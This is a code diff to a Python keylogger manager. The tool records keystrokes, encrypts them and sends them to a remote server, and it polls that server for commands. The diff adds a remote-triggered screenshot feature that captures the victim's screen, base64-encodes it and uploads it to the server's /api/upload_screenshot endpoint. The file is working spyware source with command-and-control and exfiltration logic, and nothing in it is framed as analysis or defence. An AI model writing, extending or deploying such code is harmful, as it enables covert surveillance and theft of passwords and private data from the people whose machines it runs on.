@@ -1,7 +1,7 @@
 from service import KeyLoggerService, FileWriter, Encryptor,NetworkWriter
 from Interface import IKeyLoggerManager
 from pynput.keyboard import Listener
-import threading, time, requests, sys,yaml
+import threading, time, requests, sys,yaml, pyautogui, base64, io
 
 with open("config.yaml", "r") as f:
     config = yaml.safe_load(f)
@@ -45,16 +45,38 @@ class KeyLoggerManager(IKeyLoggerManager):
             time.sleep(10)
 
     def check_commands(self):
-        try:
-            response = requests.get(f"{URL}/api/commands/{self.__serial_number}")
-            if response.status_code == 200:
-                commands = response.json().get('commands', {})
-                if commands.get('shutdown', False):
-                    self.stop_logging()
-        except requests.exceptions.RequestException:
-            pass
+            try:
+                response = requests.get(f"{URL}/api/check_commands/{self.__serial_number}")
+                if response.status_code == 200:
+                    commands = response.json().get('commands', {})
+                    if commands.get('shutdown', False):
+                        self.stop_logging()
+                    if commands.get('screenshot', False):
+                        self.take_screenshot()
+
+            except requests.exceptions.RequestException:
+                pass
 
     def __encrypt_and_send_data(self):
         data = self.__key_logger.get_logged_keys()
         encrypt_data = {self.__encryptor.encrypt(key): self.__encryptor.encrypt(value) for key, value in data.items()}
         self.__writer.write(self.__serial_number, encrypt_data)
+
+
+    def take_screenshot(self):
+        try:
+            screenshot = pyautogui.screenshot()
+            img_byte_arr = io.BytesIO()
+            screenshot.save(img_byte_arr, format='PNG')
+            img_bytes = img_byte_arr.getvalue()
+            encoded_img = base64.b64encode(img_bytes).decode('utf-8')
+            data = {
+                "machine": str(self.__serial_number),
+                "screenshot": encoded_img,
+            }
+
+            response = requests.post(URL + '/api/upload_screenshot', json=data)
+            return response.status_code == 200
+
+        except Exception as e:
+            pass
